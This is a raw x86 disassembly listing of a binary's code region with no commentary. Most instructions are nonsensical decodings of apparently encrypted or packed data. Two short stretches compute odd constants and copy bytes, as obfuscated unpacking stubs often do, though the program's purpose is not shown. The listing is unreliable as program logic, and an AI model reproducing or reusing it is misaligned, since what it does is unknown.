  40d9d7:	mov    bh,0x80
  40d9d9:	xor    BYTE PTR [ebp+0x7ddf0706],0x9c
  40d9e0:	std    
  40d9e1:	and    DWORD PTR [edi+0x525d018b],0x61
  40d9e8:	inc    edi
  40d9e9:	rcl    DWORD PTR [edi-0x69],0x8
  40d9ed:	test   al,0xed
  40d9ef:	add    eax,0x942ec6e9
  40d9f4:	or     eax,0x49364688
  40d9f9:	lea    esi,[ebx]
  40d9fb:	xchg   BYTE PTR [ecx],cl
  40d9fd:	lods   eax,DWORD PTR ds:[esi]
  40d9fe:	mov    dh,0x96
  40da00:	fsubr  DWORD PTR [ebp-0x4a3ccb85]
  40da06:	mov    dh,0x74
  40da08:	fucom  st(3)
  40da0a:	mov    DWORD PTR [ecx],esp
  40da0c:	or     al,BYTE PTR [eax+0x9]
  40da0f:	test   DWORD PTR [eax],esi
  40da11:	jp     0x40d9ac
  40da13:	out    0x10,al
  40da15:	iret   
  40da16:	sahf   
  40da17:	jns    0x40d99b
  40da19:	sbb    cl,bh
  40da1b:	bound  eax,QWORD PTR [eax]
  40da1d:	mov    ecx,0xcff9e9cb
  40da22:	js     0x40da75
  40da24:	repz mov bh,0x66
  40da27:	mov    eax,0xb5c29c76
  40da2c:	addr16 int 0xc
  40da2f:	add    DWORD PTR [edi-0x28],esi
  40da32:	xchg   edi,eax
  40da33:	je     0x40da7f
  40da35:	scas   al,BYTE PTR es:[edi]
  40da36:	lods   al,BYTE PTR ds:[esi]
  40da37:	dec    esi
  40da38:	les    ebp,FWORD PTR [eax+0x6e]
  40da3b:	fnstenv [edi-0x11]
  40da3e:	adc    DWORD PTR [ebp+0x29],edi
  40da41:	xchg   esi,eax
  40da42:	call   FWORD PTR [ebx+0x36]
  40da45:	sbb    BYTE PTR ds:0x3fe00f8f,al
  40da4b:	or     dh,0x69
  40da4e:	jns    0x40da62
  40da50:	sahf   
  40da51:	ficom  DWORD PTR [eax+0x29]
  40da54:	jmp    DWORD PTR [esi+edx*2-0x4f139c02]
  40da5b:	nop
  40da5c:	outs   dx,BYTE PTR ds:[esi]
  40da5d:	and    BYTE PTR [edi-0x462be148],dh
  40da63:	pop    esp
  40da64:	ror    DWORD PTR [ebp-0x6f],1
  40da67:	xor    eax,DWORD PTR [ebp+0x3a1bbbbd]
  40da6d:	mov    ah,0xff
  40da6f:	cdq    
  40da70:	pop    edi
  40da71:	(bad)  
  40da72:	stos   DWORD PTR es:[edi],eax
  40da73:	cmp    eax,0xf0f28cc7
  40da78:	and    ah,ah
  40da7a:	mov    ebp,0xf84a0198
  40da7f:	retf   
  40da80:	mul    DWORD PTR [eax+0x79]
  40da83:	xlat   BYTE PTR ds:[ebx]
  40da84:	adc    bh,BYTE PTR [edx+0x5]
  40da87:	xchg   edi,eax
  40da88:	adc    eax,0xc2ba14bd
  40da8d:	js     0x40dab6
  40da8f:	cmp    BYTE PTR [esi],bh
  40da91:	mov    esi,0xf2f2cc5f
  40da96:	lahf   
  40da97:	scas   eax,DWORD PTR es:[edi]
  40da98:	inc    edx
  40da99:	repz rol BYTE PTR [esi+edx*2+0x27],1
  40da9e:	enter  0x462a,0x3a
  40daa2:	retf   
  40daa3:	(bad)  
  40daa4:	shl    bh,cl
  40daa6:	add    esp,DWORD PTR [eax-0x54]
  40daa9:	sub    eax,ebx
  40daab:	dec    esp
  40daac:	(bad)  
  40daad:	mov    dh,0xf5
  40daaf:	repnz test dh,bh
  40dab2:	ss call 0x252fa1a9
  40dab8:	fldcw  WORD PTR [edx*1+0x5e81d191]
  40dabf:	enter  0x5958,0xa8
  40dac3:	sar    BYTE PTR [ebx-0xe7090a2],cl
  40dac9:	cmp    BYTE PTR [ebp+0x3],ch
  40dacc:	push   ss
  40dacd:	lods   al,BYTE PTR ds:[esi]
  40dace:	jg     0x40db49
  40dad0:	fld    DWORD PTR [esp+ebp*8-0x56]
  40dad4:	jecxz  0x40dae1
  40dad6:	fistp  DWORD PTR [ebx]
  40dad8:	jge    0x40da88
  40dada:	popf   
  40dadb:	and    BYTE PTR [ecx-0x1e11f49e],cl
  40dae1:	addr16 add al,0x1b
  40dae4:	push   ebp
  40dae5:	mov    dh,0x77
  40dae7:	mov    DWORD PTR [edx],ecx
  40dae9:	into   
  40daea:	jle    0x40da7d
  40daec:	pop    es
  40daed:	pop    eax
  40daee:	es and ah,ah
  40daf1:	(bad)  
  40daf2:	fstp   st(2)
  40daf4:	retf   
  40daf5:	cs mov ecx,0xb631945f
  40dafb:	sub    al,0xb1
  40dafd:	add    DWORD PTR [edx],0x75
  40db00:	sbb    BYTE PTR [esi+edx*2+0x563d798c],0x3e
  40db08:	idiv   BYTE PTR [ecx]
  40db0a:	xchg   BYTE PTR [ebx-0x2a52e3e],bh
  40db10:	cli    
  40db11:	add    BYTE PTR [ebp-0x7cce7278],ah
  40db17:	fadd   QWORD PTR [esi+0x7b]
  40db1a:	push   ebx
  40db1b:	pop    esi
  40db1c:	xchg   esp,eax
  40db1d:	imul   eax,DWORD PTR [ecx],0xf9664aed
  40db23:	lea    eax,[ebp+0x2b]
  40db26:	ret    0xabd3
  40db29:	cs sub ebp,edx
  40db2c:	pusha  
  40db2d:	das    
  40db2e:	in     al,0xf8
  40db30:	mov    bh,BYTE PTR [edx+0x66]
  40db33:	shl    DWORD PTR [ebp+0x1f],0x83
  40db37:	adc    eax,0x67feefba
  40db3c:	popa   
  40db3d:	inc    edx
  40db3e:	inc    ebx
  40db3f:	mov    edi,0xde109945
  40db44:	mov    eax,DWORD PTR [ebp+0x8]
  40db47:	imul   ecx,ecx,0x2e01
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40db23
  40db97:	sti    
  40db98:	xchg   DWORD PTR [ebx+ebx*2-0x2e],edi
  40db9c:	sbb    BYTE PTR [eax],bl
  40db9e:	rcl    BYTE PTR [eax+ebx*1],cl
  40dba1:	sbb    BYTE PTR [esi+0xcded9d6],ch
  40dba7:	jmp    FWORD PTR [esi-0x2e]
  40dbaa:	mov    ebx,0x10dd9823
  40dbaf:	ins    DWORD PTR es:[edi],dx
  40dbb0:	pop    ds
  40dbb1:	pop    es
  40dbb2:	mov    ds:0x87457275,eax
  40dbb7:	icebp  
  40dbb8:	inc    esp
  40dbb9:	or     al,0x98
  40dbbb:	retf   0x3d7a
  40dbbe:	cmp    BYTE PTR ds:0x64c1011d,al
  40dbc4:	bound  ecx,QWORD PTR ss:[esi+eax*4+0x2421534f]
  40dbcc:	imul   edx,DWORD PTR [edi-0x5511b990],0x77df8836
  40dbd6:	xchg   edi,eax
  40dbd7:	pop    edi
  40dbd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbd9:	sub    DWORD PTR [edi],esp
  40dbdb:	dec    esi
  40dbdc:	std    
  40dbdd:	(bad)  
  40dbdf:	sti    
  40dbe0:	pushf  
  40dbe1:	loop   0x40dba8
  40dbe3:	xor    eax,0x31e6bcb4
  40dbe8:	rcr    BYTE PTR [esi+0x441627a2],1
  40dbee:	adc    esi,DWORD PTR [edx+0x75a80c5f]
  40dbf4:	mov    esp,0x22016099
  40dbf9:	je     0x40dbb7
  40dbfb:	stos   DWORD PTR es:[edi],eax
  40dbfc:	pop    edx
  40dbfd:	sahf   
  40dbfe:	into   
  40dbff:	and    BYTE PTR [ebx+0x62cbf9ac],dl
  40dc05:	(bad)  
  40dc06:	fsub   DWORD PTR [esi-0x73]
  40dc09:	sbb    al,0xec
  40dc0b:	mov    dl,0xd9
  40dc0d:	mov    dh,0xfb
  40dc0f:	xchg   edx,eax
  40dc10:	jbe    0x40dbe8
  40dc12:	adc    edi,DWORD PTR [edx+edx*2]
  40dc15:	xor    ch,dh
  40dc17:	loopne 0x40dbad
  40dc19:	lods   al,BYTE PTR ds:[esi]
  40dc1a:	mov    dh,0xb
  40dc1c:	enter  0x883d,0x40
  40dc20:	xchg   ecx,eax
  40dc21:	sahf   
  40dc22:	mov    edx,0x6a051f13
  40dc27:	cmp    DWORD PTR [ecx],0xffffffd7
  40dc2a:	mov    eax,0xd341309b
  40dc2f:	xchg   DWORD PTR [edi],edi
  40dc31:	mov    ds:0x2779f570,eax
  40dc36:	lahf   
  40dc37:	xchg   esi,eax
  40dc38:	mov    bh,0x7a
  40dc3b:	test   ebx,0xcc921b56
  40dc41:	adc    al,0x99
  40dc43:	fisttp DWORD PTR [edx+0x6d]
  40dc46:	push   esi
  40dc47:	mov    edx,eax
  40dc49:	pop    ebp
  40dc4a:	lods   al,BYTE PTR ds:[esi]
  40dc4b:	sbb    eax,0x80da2ac8
  40dc50:	pop    esp
  40dc51:	scas   al,BYTE PTR es:[edi]
  40dc52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc53:	pop    esi
  40dc54:	test   ebp,ebx
  40dc56:	out    0xa8,eax
  40dc58:	mov    BYTE PTR [eax+esi*1],bl
  40dc5b:	mov    ch,0x3b
  40dc5d:	ror    BYTE PTR ss:0xfb7ac801,0x95
  40dc65:	or     ch,ch
  40dc67:	sahf   
  40dc68:	in     eax,dx
  40dc69:	popf   
  40dc6a:	dec    eax
  40dc6b:	enter  0x985,0x27
  40dc6f:	push   ebx
  40dc70:	xchg   BYTE PTR [ebp+eax*1-0x7f],bl
  40dc74:	adc    al,0xb0
  40dc76:	fidivr WORD PTR [ecx-0x356fa7e9]
  40dc7c:	out    dx,eax
  40dc7d:	lods   al,BYTE PTR ds:[esi]
  40dc7e:	lea    esp,[eax-0x78eb6d73]
  40dc84:	mov    eax,0x5378a341
  40dc89:	push   ebp
  40dc8a:	(bad)  
  40dc8b:	into   
  40dc8c:	in     al,0xa9
  40dc8e:	(bad)
  40dc92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc93:	add    edi,esp
  40dc95:	add    DWORD PTR [ecx],0xfffffff1
  40dc98:	in     eax,dx
  40dc99:	arpl   dx,ax
  40dc9b:	test   al,0xba
  40dc9d:	mov    ecx,0x8876398d
  40dca2:	pusha  
  40dca3:	push   ds
  40dca4:	popf   
  40dca5:	bound  eax,QWORD PTR [bp+si-0x67c2]
  40dcaa:	dec    eax
  40dcab:	std    
  40dcac:	imul   ebp,edi,0x3b82bf43
  40dcb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcb3:	cdq    
  40dcb4:	in     eax,dx
  40dcb5:	sub    eax,0x8475bb72
  40dcba:	push   edi
  40dcbb:	out    0xc8,al
  40dcbd:	dec    ebp
  40dcbe:	push   cs
  40dcbf:	js     0x40dd3d
  40dcc1:	cld    
  40dcc2:	daa    
  40dcc3:	ds lock jbe 0x40dce6
  40dcc7:	pusha  
  40dcc8:	push   ebp
  40dcc9:	cli    
  40dcca:	mov    esi,0x6d238e7c
  40dccf:	test   BYTE PTR [edi+ebp*8],ah
  40dcd2:	mov    esp,0x5e0b8cb2
  40dcd7:	clc    
  40dcd8:	or     eax,0x83d0988d
  40dcdd:	(bad)  
  40dcde:	sti    
  40dcdf:	in     eax,dx
  40dce0:	jne    0x40dd1d
  40dce2:	mov    edx,DWORD PTR [esi+0x697b3c78]
  40dce8:	dec    ebx
  40dce9:	ins    BYTE PTR es:[edi],dx
  40dcea:	mov    ds:0x39a61b91,eax
  40dcef:	sar    BYTE PTR [ebx+0x6a5c1ee1],0xca
  40dcf6:	jnp    0x40dcd7
  40dcf8:	jl     0x40dd25
  40dcfa:	push   edx
  40dcfc:	aam    0x3b
  40dcfe:	ins    DWORD PTR es:[edi],dx
  40dcff:	dec    ecx
  40dd00:	inc    edx
  40dd01:	lock push es
  40dd03:	xchg   ebx,eax
  40dd05:	dec    eax
  40dd06:	jmp    0x1ef475cf
  40dd0b:	mov    dh,BYTE PTR [edx+0x60]
  40dd0e:	xchg   DWORD PTR [ecx],ebx
  40dd10:	inc    edi
  40dd11:	leave  
  40dd12:	or     cl,bl
  40dd14:	jg     0x40dd2b
  40dd16:	jne    0x40dd3b
  40dd18:	jmp    0x824e45cd
  40dd1d:	aaa    
  40dd1e:	enter  0x757f,0x95
  40dd22:	dec    esi
  40dd23:	arpl   WORD PTR ds:0x58073a16,ax
  40dd29:	sahf   
  40dd2a:	repz sub DWORD PTR ds:0x86357d2a,ebp
  40dd31:	push   esi
  40dd32:	cli    
  40dd33:	inc    esi
  40dd34:	mov    esi,0xc9549c42
  40dd39:	scas   eax,DWORD PTR es:[edi]
  40dd3a:	inc    ebx
  40dd3b:	push   es
  40dd3c:	jle    0x40dd0b
  40dd3e:	jbe    0x40dd45
  40dd40:	and    ebx,DWORD PTR [edx+0x8adfd26]
  40dd46:	push   esi
  40dd47:	in     eax,dx
  40dd48:	sbb    al,0x6c
  40dd4a:	xchg   ebp,eax
  40dd4b:	pop    ds
  40dd4c:	mul    DWORD PTR [ebp-0x57572b3d]
  40dd52:	retf   
  40dd53:	leave  
  40dd54:	push   0x2c601f2f
  40dd59:	mov    ebx,0x1521a2f2
  40dd5e:	push   ebp
  40dd5f:	(bad)
  40dd62:	repnz les edi,FWORD PTR [edi-0x6e]
  40dd66:	retf   
  40dd67:	sbb    ebx,DWORD PTR [esi]
  40dd69:	xor    al,0x9c
  40dd6b:	pop    ss
  40dd6c:	adc    ebx,esp
  40dd6e:	test   eax,0x796514ef
  40dd73:	sub    al,0xcf
  40dd75:	das    
  40dd76:	pop    ebp
  40dd77:	dec    eax
  40dd78:	xchg   DWORD PTR [edi],esi
  40dd7a:	or     esp,DWORD PTR [ecx+0x5656c80]
  40dd80:	arpl   WORD PTR [esi+0x0],dx
  40dd83:	fdiv   st(4),st
  40dd85:	mov    al,ds:0xcef5f966
  40dd8a:	mov    ebx,0x72e62ca
  40dd8f:	mov    edx,eax
  40dd91:	xchg   ebp,eax
  40dd92:	sahf   
  40dd93:	icebp  
  40dd94:	xchg   edx,eax
  40dd95:	rcl    BYTE PTR [esi],cl
  40dd97:	push   esp
  40dd98:	outs   dx,DWORD PTR ds:[esi]
  40dd99:	push   0x59229e22
  40dd9e:	aad    0x64
  40dda0:	fsubrp st(3),st
  40dda2:	out    0x8f,al
  40dda4:	inc    eax
  40dda5:	or     eax,0x36311c5f
  40ddaa:	add    BYTE PTR [eiz*1+0x263e6054],cl
  40ddb1:	gs push eax
  40ddb3:	mov    WORD PTR [edi-0x5fec6606],ss
  40ddb9:	iret   
  40ddba:	dec    edi
  40ddbb:	dec    ecx
  40ddbc:	mov    bh,0x8f
  40ddbe:	push   esi
  40ddbf:	mov    bl,0x86
  40ddc1:	dec    edi
  40ddc2:	pop    ecx
  40ddc3:	dec    ebx
  40ddc4:	push   edx
  40ddc5:	or     al,0xc0
  40ddc7:	xchg   BYTE PTR [ebp+0x7a],cl
  40ddca:	add    bl,BYTE PTR [edx-0x1f6e1a27]
  40ddd0:	add    BYTE PTR [edi-0x2c],dl
  40ddd3:	dec    ebp
  40ddd4:	fwait
  40ddd5:	jo     0x40de49
  40ddd7:	iret   
  40ddd8:	mov    bh,0x5d
  40ddda:	xlat   BYTE PTR ds:[ebx]
  40dddb:	lds    ebp,FWORD PTR [esi-0x15]
  40ddde:	push   edi
  40dddf:	cmp    al,0x75
  40dde1:	imul   esi,edi,0xffffffb9
  40dde4:	cmp    eax,0x59e9a0b9
  40dde9:	and    BYTE PTR [edx-0x687cdbcd],dl
  40ddef:	push   0x236b49cd
  40ddf4:	sub    al,ah
  40ddf6:	bound  ecx,QWORD PTR [eax]
  40ddf8:	or     al,bh
  40ddfa:	sbb    BYTE PTR [ebx],ah
  40ddfc:	js     0x40de54
  40ddfe:	push   ss
  40ddff:	jbe    0x40de74
  40de01:	cmp    DWORD PTR [ecx-0x27],ebx
  40de04:	add    eax,0xf649d22f
  40de09:	into   
  40de0a:	jp     0x40de2f
  40de0c:	out    0xed,eax
  40de0e:	(bad)  
  40de10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de11:	sub    ch,BYTE PTR [eax+ecx*2-0x61b19fd3]
  40de18:	adc    esi,DWORD PTR [ecx]
  40de1a:	mov    BYTE PTR [edi+0x32],al
  40de1d:	or     al,0x59
  40de1f:	adc    BYTE PTR [ebx+0x2d14cdd],bl
  40de25:	push   edx
  40de26:	outs   dx,DWORD PTR ds:[esi]
  40de27:	lahf   
  40de28:	or     BYTE PTR [edx-0x4a],0xaf
  40de2c:	mov    dl,0x9b
  40de2e:	loope  0x40de1d
  40de30:	imul   ecx,DWORD PTR [ecx],0x98e369a7
  40de36:	std    
  40de37:	(bad)  
  40de38:	mov    al,0x6f
  40de3a:	mov    ds:0x7443e108,eax
  40de3f:	inc    edx
  40de40:	pop    ebp
  40de41:	mov    ah,0xe9
  40de43:	jnp    0x40ddd2
  40de45:	outs   dx,DWORD PTR ds:[esi]
  40de46:	pop    eax
  40de47:	fs inc esp
  40de49:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40de50:	mov    DWORD PTR [ebp-0x14],0x13cd
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422518
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40dec8
  40deca:	mov    al,0x99
  40decc:	mov    esp,0x1818cc14
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    al,ch
  40ded6:	jge    0x40dee8
  40ded8:	fistp  WORD PTR [edi]
  40deda:	lahf   
  40dedb:	jge    0x40df00
  40dedd:	sar    DWORD PTR [esi+esi*4],0x65
  40dee1:	jmp    0x7c3dfd9b
  40dee6:	mov    eax,ds:0x2a2e4aa6
  40deeb:	fwait
  40deec:	out    0x63,eax
  40deee:	or     ebx,DWORD PTR [eax+0x61]
  40def1:	inc    edx
  40def2:	or     DWORD PTR [ecx-0x19],edx
  40def5:	jns    0x40dee3
  40def7:	neg    DWORD PTR [ebp-0x5e055d2c]
  40defd:	xchg   esp,eax
  40defe:	and    dh,BYTE PTR [esi-0x52]
  40df01:	push   ebp
  40df02:	adc    al,0xb0
  40df04:	cmp    al,0xa6
  40df06:	sbb    esi,ebp
  40df08:	loop   0x40de9d
  40df0a:	push   cs
  40df0b:	xlat   BYTE PTR ds:[ebx]
  40df0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df0d:	dec    ebp
  40df0e:	(bad)  
  40df0f:	jmp    0xada0:0xa219d2b4
  40df16:	jg     0x40deda
  40df18:	jb     0x40df4e
  40df1a:	jecxz  0x40ded9
  40df1c:	in     eax,dx
  40df1d:	and    DWORD PTR [esi],esi
  40df1f:	cdq    
  40df20:	in     eax,dx
  40df21:	push   ds
  40df22:	aas    
  40df23:	stos   BYTE PTR es:[edi],al
  40df24:	fldenv [ecx-0x30214746]
  40df2a:	mov    WORD PTR [edx+0x11622326],ss
  40df30:	sub    eax,0xe9a38446
  40df35:	dec    ebp
  40df36:	mov    BYTE PTR [edx+0xb],bh
  40df39:	psubq  mm0,QWORD PTR [esi]
  40df3c:	jg     0x40deee
  40df3e:	xchg   DWORD PTR [ebx],ebx
  40df40:	frndint 
  40df42:	pop    esi
  40df43:	xchg   ebx,eax
  40df44:	cdq    
  40df45:	lock mov DWORD PTR [ebx+0x37],esi
  40df49:	sbb    eax,0xc9543272
  40df4e:	xchg   edx,eax
  40df4f:	inc    ebp
  40df50:	fistp  WORD PTR ds:0xbabe14d7
  40df56:	sbb    al,0x41
  40df58:	bound  esp,QWORD PTR cs:[esi-0x18]
  40df5c:	sahf   
  40df5d:	push   edi
  40df5e:	jo     0x40df70
  40df60:	adc    eax,0xa3662ee3
  40df65:	dec    ebx
  40df66:	mov    ah,0x9b
  40df68:	lock push ebp
  40df6a:	jns    0x40dfd0
  40df6c:	lods   eax,DWORD PTR ds:[esi]
  40df6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df6e:	shl    BYTE PTR [edi+0x75c780bd],1
  40df74:	push   0xffffffde
  40df76:	jns    0x40dfbf
  40df78:	xchg   ecx,eax
  40df79:	or     al,bh
  40df7b:	dec    ebp
  40df7c:	push   ds
  40df7d:	and    esp,DWORD PTR [edi-0x28dd3c45]
  40df83:	adc    ebp,DWORD PTR [ebp+0x2a7ecae8]
  40df89:	stos   BYTE PTR es:[edi],al
  40df8a:	push   edi
  40df8b:	xor    BYTE PTR [ebx+0xe22ce42],dh
  40df91:	xlat   BYTE PTR ds:[ebx]
  40df92:	pop    esp
  40df93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df94:	xor    edx,DWORD PTR ds:0x836c34b9
  40df9a:	mov    cl,0x86
  40df9c:	in     eax,dx
  40df9d:	xor    DWORD PTR [ebx+0x525dd5b3],esp
  40dfa3:	outs   dx,BYTE PTR ds:[esi]
  40dfa4:	push   ebx
  40dfa5:	aad    0xdb
  40dfa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfa8:	push   ds
  40dfa9:	sub    BYTE PTR [eax+0x64],ch
  40dfac:	mov    al,0xee
  40dfae:	mov    al,0x2d
  40dfb0:	fsubr  DWORD PTR [edi-0x5b8d0e1e]
  40dfb6:	hlt    
  40dfb7:	push   esp
  40dfb8:	mov    ah,BYTE PTR [edi]
  40dfba:	retf   
  40dfbb:	push   0x6f
  40dfbd:	or     eax,0xda9a1d63
  40dfc2:	std    
  40dfc3:	fisubr DWORD PTR [esi+0x3]
  40dfc6:	xchg   dh,ah
  40dfc8:	mov    bh,0xfd
  40dfca:	xor    dl,dl
  40dfcc:	pop    edx
  40dfcd:	or     ah,BYTE PTR [esi+esi*2]
  40dfd0:	into   
  40dfd1:	pop    edi
  40dfd2:	mov    BYTE PTR [edi+0x6b85d28d],bl
  40dfd8:	push   ss
  40dfd9:	ins    DWORD PTR es:[edi],dx
  40dfda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfdb:	loop   0x40dffe
  40dfdd:	mov    WORD PTR [edi],ss
  40dfdf:	mov    edi,0x97564044
  40dfe4:	pusha  
  40dfe5:	imul   esp,DWORD PTR [ebx+edx*8],0x247c7610
  40dfec:	mov    ebp,0x870b5b36
  40dff1:	rcr    DWORD PTR [edx+ebp*4+0x2c],1
  40dff5:	xchg   edi,eax
  40dff6:	icebp  
  40dff7:	push   0x3b2c667b
  40dffc:	jmp    0xa213:0xad603f67
  40e003:	shl    bh,0x3a
  40e006:	mov    bl,0x62
  40e008:	stos   DWORD PTR es:[edi],eax
  40e009:	addr16 cmc 
  40e00b:	jmp    0xe0726a99
  40e010:	scas   al,BYTE PTR es:[edi]
  40e011:	adc    al,0xdf
  40e013:	ret    0xebfc
  40e016:	lahf   
  40e017:	or     ebx,edi
  40e019:	in     eax,0x4d
  40e01b:	push   0xfffffffa
  40e01d:	jbe    0x40dfbf
  40e01f:	jne    0x40dfac
  40e021:	mov    ecx,0x31199237
  40e026:	fld    QWORD PTR [esi]
  40e028:	jne    0x40dffb
  40e02a:	(bad)  
  40e02b:	mov    ah,BYTE PTR [esp+esi*2+0x1f2480c6]
  40e032:	and    ebp,esp
  40e034:	mov    dl,0xe2
  40e036:	out    dx,al
  40e037:	xor    BYTE PTR [ebx+0xfac8778],ah
  40e03d:	sbb    ebx,ecx
  40e03f:	xchg   DWORD PTR [eax-0x5cc9c08a],esp
  40e045:	and    ecx,esi
  40e047:	cmovbe edx,DWORD PTR [ebx+0x10]
  40e04b:	cmc    
  40e04c:	mov    bl,BYTE PTR [ecx]
  40e04e:	inc    ebx
  40e04f:	xchg   ecx,eax
  40e050:	mov    dh,0x89
  40e052:	fsubrp st(3),st
  40e054:	add    al,0x5c
  40e056:	fimul  WORD PTR [ecx+0x3498efc1]
  40e05c:	sub    ebx,ecx
  40e05e:	xchg   esi,eax
  40e05f:	sbb    BYTE PTR [eax-0x2f],bh
  40e062:	dec    esp
  40e063:	mov    esi,0xd53e2fcf
  40e068:	and    ah,BYTE PTR [ecx]
  40e06a:	push   0xdea91bb1
  40e06f:	jmp    0x40e087
  40e071:	(bad)  
  40e072:	addr16 cmp dl,cl
  40e075:	sbb    DWORD PTR [esi],edi
  40e077:	dec    ebp
  40e078:	mov    cl,0x25
  40e07a:	mov    al,ds:0x2464d983
  40e07f:	mov    bh,0xd0
  40e081:	imul   ebp,DWORD PTR [eax-0x62f73e44],0x6f3eed36
  40e08b:	(bad)  
  40e08c:	cli    
  40e08d:	add    BYTE PTR [eax],dl
  40e08f:	jbe    0x40e049
  40e091:	cli    
  40e092:	mov    al,ds:0xad80616b
  40e097:	jmp    0x2d77b56d
  40e09c:	pop    eax
  40e09d:	or     cl,dh
  40e09f:	jmp    0x40e0d2
  40e0a1:	lock (bad) 
  40e0a4:	fs clc 
  40e0a6:	cli    
  40e0a7:	mov    edx,0x24e79ef8
  40e0ac:	mov    cl,0xf
  40e0ae:	fidivr DWORD PTR [edx]
  40e0b0:	data16 jl 0x40e063
  40e0b3:	lds    ecx,FWORD PTR [edx+0x703c19c1]
  40e0b9:	aam    0x69
  40e0bb:	jle    0x40e06d
  40e0bd:	lock sbb BYTE PTR [eax+0x51],dl
  40e0c1:	xchg   esp,eax
  40e0c2:	pop    ds
  40e0c3:	das    
  40e0c4:	adc    DWORD PTR [ecx+ebp*1],0xffffffb8
  40e0c8:	cmp    al,0x4b
  40e0ca:	dec    ebp
  40e0cb:	mov    DWORD PTR [ebp+edx*4-0x4f20883e],ebp
  40e0d2:	dec    ebp
  40e0d3:	add    BYTE PTR [ebx-0x25],0x2e
  40e0d7:	lock popf 
  40e0d9:	or     ecx,DWORD PTR [eax-0x60]
  40e0dc:	cli    
  40e0dd:	add    eax,0xc4c2bf7e
  40e0e2:	and    ebx,DWORD PTR [edx-0x239af184]
  40e0e8:	adc    DWORD PTR [ecx+0x67cbc85e],0xfffffff2
  40e0ef:	cmp    ax,0x728e
  40e0f3:	dec    eax
  40e0f4:	(bad)  
  40e0f5:	lock addr16 iret 
  40e0f8:	sbb    ebx,esi
  40e0fa:	call   DWORD PTR ds:0x6dd15e4a
  40e100:	xchg   DWORD PTR [edx+edi*8],eax
  40e103:	fcmovnb st,st(0)
  40e105:	add    BYTE PTR [edx-0x71],dl
  40e108:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e109:	push   ebp
  40e10a:	lahf   
  40e10b:	fs jmp 0x40e113
  40e10e:	enter  0x7ded,0x6f
  40e112:	cs ins BYTE PTR es:[edi],dx
  40e114:	push   eax
  40e115:	mov    al,0x33
  40e117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e118:	push   ecx
  40e119:	(bad)  
  40e11a:	jg     0x40e120
  40e11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e11d:	sbb    BYTE PTR [esi-0x75e6209b],ch
  40e123:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40e125:	sbb    al,0x3c
  40e127:	vpsllq ymm0,ymm5,xmm5
  40e12b:	hlt    
  40e12c:	mov    edi,0xf384cd3a
  40e131:	ss adc al,0x3c
  40e134:	pop    eax
  40e135:	inc    ebx
  40e136:	mov    WORD PTR [edx-0x1a],?
  40e139:	call   0x7b72b0fb
  40e13e:	inc    ecx
  40e13f:	es sahf 
  40e141:	push   es
  40e142:	es aam 0x8a
  40e145:	std    
  40e146:	mov    eax,0x7bae1831
  40e14b:	icebp  
  40e14c:	scas   al,BYTE PTR es:[edi]
  40e14d:	inc    edi
  40e14e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e14f:	dec    eax
  40e150:	dec    ebp
  40e151:	ja     0x40e1b0
  40e153:	loope  0x40e101
  40e155:	packuswb mm3,mm1
  40e158:	lahf   
  40e159:	cmp    edx,ecx
  40e15b:	jge    0x40e0f0
  40e15d:	loope  0x40e1a4
